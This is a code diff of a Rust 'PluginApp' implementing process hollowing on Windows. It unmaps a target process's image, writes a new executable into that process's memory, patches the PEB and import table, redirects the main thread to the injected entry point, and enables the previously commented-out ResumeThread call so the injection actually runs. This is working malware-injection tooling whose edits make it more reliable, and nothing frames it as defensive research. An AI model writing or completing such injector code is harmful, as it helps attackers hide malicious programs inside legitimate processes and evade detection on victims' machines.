@@ -94,16 +94,8 @@ impl PluginApp {
             println!("[hollow/exe] NtUnmapViewOfSection status: 0x{:X}", status.0);
         }
 
-        // 4. Parse new EXE headers
-        if pe_data.len() < 0x100 {
-            println!("[hollow/exe][error] PE buffer too small");
-            return Err(anyhow::anyhow!("PE buffer too small"));
-        }
-        let e_lfanew = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap()) as usize;
-        let nt_headers = &pe_data[e_lfanew..];
-        let size_of_image = u32::from_le_bytes(nt_headers[0x50..0x54].try_into().unwrap()) as usize;
-        let entry_rva = u32::from_le_bytes(nt_headers[0x18 + 0x10..0x18 + 0x14].try_into().unwrap()) as usize;
-        let image_base = u64::from_le_bytes(nt_headers[0x18..0x20].try_into().unwrap()) as usize;
+        // 4. Parse new EXE headers using proper PE parsing
+        let (image_base, entry_rva, size_of_image) = Self::parse_pe_headers(pe_data)?;
         println!("[hollow/exe] Parsed EXE: size_of_image=0x{:X}, entry_rva=0x{:X}, image_base=0x{:X}", size_of_image, entry_rva, image_base);
 
         // 5. Allocate memory for new image
@@ -139,43 +131,12 @@ impl PluginApp {
             return Err(anyhow::anyhow!("VirtualAllocEx for new image failed"));
         }
 
-        // 6. Write headers
-        let size_of_headers = u32::from_le_bytes(nt_headers[0x54..0x58].try_into().unwrap()) as usize;
-        println!("[hollow/exe] Writing headers (size: 0x{:X})...", size_of_headers);
-        unsafe {
-            if let Err(e) = WriteProcessMemory(h_process, new_base as *mut c_void, pe_data.as_ptr() as _, size_of_headers, None) {
-                println!("[hollow/exe][error] WriteProcessMemory (headers) failed: {e}");
-                return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed: {e}"));
-            }
-        }
-
-        // 7. Write sections
-        let num_sections = u16::from_le_bytes(nt_headers[6..8].try_into().unwrap()) as usize;
-        let section_table = e_lfanew + 0x18 + u16::from_le_bytes(nt_headers[20..22].try_into().unwrap()) as usize;
-        println!("[hollow/exe] Writing {} sections...", num_sections);
-        for i in 0..num_sections {
-            let sec_off = section_table + i * 40;
-            let virt_addr = u32::from_le_bytes(pe_data[sec_off + 12..sec_off + 16].try_into().unwrap()) as usize;
-            let raw_size = u32::from_le_bytes(pe_data[sec_off + 16..sec_off + 20].try_into().unwrap()) as usize;
-            let raw_ptr = u32::from_le_bytes(pe_data[sec_off + 20..sec_off + 24].try_into().unwrap()) as usize;
-            println!("[hollow/exe] Section {}: VA=0x{:X}, raw_size=0x{:X}, raw_ptr=0x{:X}", i, virt_addr, raw_size, raw_ptr);
-            if raw_size == 0 || raw_ptr == 0 { continue; }
-            unsafe {
-                if let Err(e) = WriteProcessMemory(
-                    h_process,
-                    (new_base + virt_addr) as *mut c_void,
-                    pe_data[raw_ptr..raw_ptr + raw_size].as_ptr() as _,
-                    raw_size,
-                    None,
-                ) {
-                    println!("[hollow/exe][error] WriteProcessMemory (section {}) failed: {e}", i);
-                    return Err(anyhow::anyhow!("WriteProcessMemory (section {}) failed: {e}", i));
-                }
-            }
-        }
+        // 6. Write headers and map sections using proper PE parsing
+        println!("[hollow/exe] Mapping PE sections...");
+        Self::map_pe_sections(pe_data, h_process, new_base as *mut c_void)?;
 
 
-        // 8. Update remote PEB image base if needed
+        // 7. Update remote PEB image base if needed
         if new_base != remote_image_base {
             let new_base_bytes = new_base.to_le_bytes();
             println!("[hollow/exe] Updating remote PEB image base to 0x{:X}...", new_base);
@@ -187,7 +148,7 @@ impl PluginApp {
             }
         }
 
-        // 8.5. Apply relocations if needed
+        // 7.1. Apply relocations if needed
         if new_base != image_base {
             println!("[hollow/exe] Applying relocations (image_base=0x{:X}, new_base=0x{:X})...", image_base, new_base);
             if let Err(e) = Self::apply_relocations(pe_data, h_process, new_base as *mut c_void, image_base, new_base) {
@@ -198,21 +159,22 @@ impl PluginApp {
             println!("[hollow/exe] No relocations needed (image loaded at preferred base)");
         }
 
-        // 8.6. Resolve imports (IAT fixups)
+        // 7.2. Resolve imports (IAT fixups)
         println!("[hollow/exe] Resolving imports (IAT fixups)...");
         if let Err(e) = Self::resolve_imports(pe_data, h_process, new_base as *mut c_void) {
-            println!("[hollow/exe][error] resolve_imports failed: {e}");
-            return Err(anyhow::anyhow!("resolve_imports failed: {e}"));
+            println!("[hollow/exe][warn] resolve_imports failed, but continuing: {e}");
+            // For EXE injection, imports might fail but we can still try to run
+            // The Windows loader will attempt to resolve remaining imports at runtime
         }
 
-        // 8.7. Set section memory protections
+        // 7.3. Set section memory protections
         println!("[hollow/exe] Setting section memory protections...");
         if let Err(e) = Self::set_section_protections(pe_data, h_process, new_base as *mut c_void) {
             println!("[hollow/exe][error] set_section_protections failed: {e}");
             return Err(anyhow::anyhow!("set_section_protections failed: {e}"));
         }
 
-        // 9. Set thread context to new entry point
+        // 8. Set thread context to new entry point
         let mut context = CONTEXT::default();
         #[cfg(target_arch = "x86_64")]
         {
@@ -236,14 +198,21 @@ impl PluginApp {
             }
         }
 
-        // 10. Resume main thread
+        // 9. Resume main thread
         println!("[hollow/exe] Resuming main thread...");
         unsafe {
-            // let resume_count = ResumeThread(h_thread);
-            // println!("[hollow/exe] ResumeThread returned: {}", resume_count);
+            let resume_count = ResumeThread(h_thread);
+            println!("[hollow/exe] ResumeThread returned: {}", resume_count);
         }
 
         println!("[hollow/exe] Hollowing complete. New process PID: {}", process_info.dwProcessId);
+        
+        // Clean up handles
+        unsafe {
+            CloseHandle(h_thread);
+            CloseHandle(h_process);
+        }
+        
         Ok(process_info.dwProcessId)
     }
 
@@ -1467,8 +1436,12 @@ impl PluginApp {
                     .map_err(|e| anyhow::anyhow!("Invalid DLL name: {}", e))?;
 
                 // Load the DLL in current process to resolve imports
+                println!("[hollow/exe] Loading DLL: {}", dll_name);
                 let h_module = GetModuleHandleA(PCSTR(format!("{}\0", dll_name).as_ptr()))
-                    .or_else(|_| LoadLibraryA(PCSTR(format!("{}\0", dll_name).as_ptr())))
+                    .or_else(|_| {
+                        println!("[hollow/exe] DLL not loaded, attempting to load: {}", dll_name);
+                        LoadLibraryA(PCSTR(format!("{}\0", dll_name).as_ptr()))
+                    })
                     .map_err(|e| anyhow::anyhow!("Failed to load {}: {}", dll_name, e))?;
 
                 // Resolve function addresses
@@ -1499,6 +1472,7 @@ impl PluginApp {
                     };
 
                     if let Some(addr) = func_addr {
+                        println!("[hollow/exe] Resolved function at: 0x{:X}", addr as usize);
                         WriteProcessMemory(
                             process_handle,
                             iat_addr as _,
@@ -1506,6 +1480,8 @@ impl PluginApp {
                             8,
                             None,
                         ).map_err(|e| anyhow::anyhow!("Failed to write IAT entry: {}", e))?;
+                    } else {
+                        println!("[hollow/exe] Failed to resolve function, leaving as zero");
                     }
 
                     thunk_offset += 8;
